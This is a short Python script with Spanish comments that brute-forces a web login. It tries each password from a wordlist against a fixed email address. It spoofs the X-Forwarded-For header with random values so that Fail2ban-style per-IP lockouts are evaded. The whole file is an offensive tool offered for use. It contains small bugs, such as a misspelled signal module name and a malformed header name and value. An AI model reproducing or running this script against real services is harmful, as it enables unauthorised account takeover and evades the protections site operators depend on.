#!/usr/bin/env python3
#este es una manera de bypass de un Fail2ban o bloqueo por masas de un intento


from pwn import *
from termcolor import colored
import requests, random , time, signal, sys

def def_handrel(sig, frame):
    print(colored(f"\n\n[!] Saliendo......\n", "red"))
    sys.exit(1)

signal.signal(signa.SIGINT, def_handrel) #manejo del Ctrl + c

main_url = "" #endpoint
email = "planbkid@gmail.com"

def bruteforce():
    f = open("wordlist.txt","r")
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Fuerza Bruta")

    time.sleep(3)

    for password in f.readlines(): #funcion para leer linea por linea el archivo
        post_data = {
            "email": email,
            "password": password.strip()
        }
        p1.status(f'Probando contraseñas {post_data["password"]}')

        headers = {
             'X-Forwarded_For': str(random.randint(1,100))#esta cabezera hace que el servidor detras de la pagina web crea que cada
             #ip distinta es valida para el servidor porque entre la pagina el servidor hay un nodo que cambia la ip de la pagina para
             #no ser encontrada permitiendo asi que cada peticion sea como la primera ves que se solicite
             
        }

        r = requests.post(main_url, json= post_data, headers=headers)

        if "false" not in r.text:
            p1.success(f"Contraseña encontrada: {password.strip()}")
            break
def main():
    bruteforce()

main()


